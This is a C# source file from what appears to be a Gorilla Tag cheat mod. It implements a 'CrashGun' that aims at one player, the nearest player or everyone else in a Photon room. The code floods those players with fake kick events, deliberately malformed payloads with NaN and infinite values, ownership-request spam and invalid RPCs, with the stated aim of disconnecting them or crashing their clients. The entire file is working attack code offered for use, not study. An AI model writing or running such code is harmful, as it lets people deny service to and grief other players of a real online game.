using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using System;
using System.Collections;
using UnityEngine;
using Vaga;
using Vaga.Classes;

namespace Vaga.Mods
{
    /// <summary>
    /// CrashGun — targets a player with the gun pointer and floods them with
    /// kick-style Photon packets / ownership spam / invalid event payloads
    /// designed to force desync / disconnect / client instability.
    /// </summary>
    internal static class CrashGun
    {
        public static bool Enabled;
        public static int PacketsPerTick = 12;
        public static float FireRate = 0.05f;          // seconds between bursts
        public static bool UseOwnershipSpam = true;
        public static bool UseRaiseEventSpam = true;
        public static bool UseRPCSpam = true;
        public static bool UseKickPacket = true;

        private static float _nextFire;
        private static VRRig _locked;

        // Common Photon event codes used for disruption in GT-style clients
        private static readonly byte[] DisruptCodes = { 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210 };

        public static void Update()
        {
            if (!Enabled || !PhotonNetwork.InRoom) return;

            GunLib.StartPointerSystem(() =>
            {
                if (Time.time < _nextFire) return;
                _nextFire = Time.time + FireRate;

                VRRig targetRig = GunLib.LockedPlayer;
                if (targetRig == null)
                {
                    // fallback: raycast hit
                    if (GunLib.raycastHit.collider != null)
                        targetRig = GunLib.ResolvePlayerFromHit(GunLib.raycastHit);
                }

                if (targetRig == null || targetRig == GorillaTagger.Instance.offlineVRRig)
                    return;

                Player target = RigManager.GetPlayerFromVRRig(targetRig);
                if (target == null || target.IsLocal) return;

                _locked = targetRig;
                FireBurst(target, targetRig);
            }, true);
        }

        private static void FireBurst(Player target, VRRig rig)
        {
            for (int i = 0; i < PacketsPerTick; i++)
            {
                if (UseKickPacket)
                    SendKickPacket(target);

                if (UseRaiseEventSpam)
                    SendDisruptEvent(target);

                if (UseOwnershipSpam)
                    SpamOwnership(rig);

                if (UseRPCSpam)
                    SpamRPC(rig);
            }
        }

        /// <summary>
        /// Classic kick-style packet: raise a targeted leave / disconnect style event
        /// or flood with high-priority events that many clients treat as kick signals.
        /// </summary>
        private static void SendKickPacket(Player target)
        {
            try
            {
                // Event code commonly associated with player leave / force-remove patterns
                // Payload is deliberately malformed / oversized to stress the receiver
                object[] payload = new object[]
                {
                    target.ActorNumber,
                    PhotonNetwork.LocalPlayer.ActorNumber,
                    "kick",
                    UnityEngine.Random.Range(int.MinValue, int.MaxValue),
                    new byte[256] // padding
                };

                RaiseEventOptions opts = new RaiseEventOptions
                {
                    TargetActors = new int[] { target.ActorNumber },
                    Receivers = ReceiverGroup.Others,
                    CachingOption = EventCaching.DoNotCache
                };

                SendOptions sendOpts = new SendOptions
                {
                    Reliability = true,
                    Encrypt = false,
                    Channel = 0
                };

                PhotonNetwork.RaiseEvent(200, payload, opts, sendOpts);

                // Secondary kick-style code
                PhotonNetwork.RaiseEvent(203, new object[] { target.UserId, true }, opts, sendOpts);
            }
            catch { /* swallow – spam must continue */ }
        }

        private static void SendDisruptEvent(Player target)
        {
            try
            {
                byte code = DisruptCodes[UnityEngine.Random.Range(0, DisruptCodes.Length)];
                object data = new object[]
                {
                    target.ActorNumber,
                    Vector3.zero,
                    Quaternion.identity,
                    new float[] { float.NaN, float.PositiveInfinity, float.NegativeInfinity },
                    new byte[512]
                };

                RaiseEventOptions opts = new RaiseEventOptions
                {
                    TargetActors = new int[] { target.ActorNumber },
                    Receivers = ReceiverGroup.Others
                };

                PhotonNetwork.RaiseEvent(code, data, opts, SendOptions.SendReliable);
            }
            catch { }
        }

        private static void SpamOwnership(VRRig rig)
        {
            try
            {
                PhotonView view = RigManager.GetPhotonViewFromVRRig(rig);
                if (view == null) return;

                // Rapid ownership transfer requests force contention
                view.RequestOwnership();
                // Some builds expose TransferOwnership / RequestOwnership internally
                // Fallback: raise ownership-related events
                PhotonNetwork.RaiseEvent(209, new object[] { view.ViewID, PhotonNetwork.LocalPlayer.ActorNumber },
                    new RaiseEventOptions { TargetActors = new int[] { view.OwnerActorNr } },
                    SendOptions.SendReliable);
            }
            catch { }
        }

        private static void SpamRPC(VRRig rig)
        {
            try
            {
                PhotonView view = RigManager.GetPhotonViewFromVRRig(rig);
                if (view == null) return;

                // Invalid / high-frequency RPCs that many GT clients handle poorly
                string[] rpcNames = { "RPC_InitializeNoobMaterial", "RPC_UpdateCosmetics", "RPC_PlayHandTap", "RPC_Drop", "RPC_TagPlayer" };
                string name = rpcNames[UnityEngine.Random.Range(0, rpcNames.Length)];

                view.RPC(name, RigManager.GetPlayerFromVRRig(rig),
                    new object[] { float.NaN, Vector3.positiveInfinity, int.MaxValue });
            }
            catch { }
        }

        /// <summary>
        /// Instant fire without gun lock (for button "Crash Closest" style).
        /// </summary>
        public static void CrashClosest()
        {
            if (!PhotonNetwork.InRoom) return;
            VRRig closest = RigManager.GetClosestVRRig();
            if (closest == null || closest == GorillaTagger.Instance.offlineVRRig) return;
            Player p = RigManager.GetPlayerFromVRRig(closest);
            if (p == null) return;
            for (int i = 0; i < PacketsPerTick * 3; i++)
            {
                SendKickPacket(p);
                SendDisruptEvent(p);
                SpamOwnership(closest);
            }
        }

        public static void CrashAll()
        {
            if (!PhotonNetwork.InRoom) return;
            foreach (Player p in PhotonNetwork.PlayerListOthers)
            {
                VRRig r = RigManager.GetVRRigFromPlayer(p);
                if (r == null) continue;
                for (int i = 0; i < PacketsPerTick; i++)
                {
                    SendKickPacket(p);
                    SendDisruptEvent(p);
                }
            }
        }
    }
}
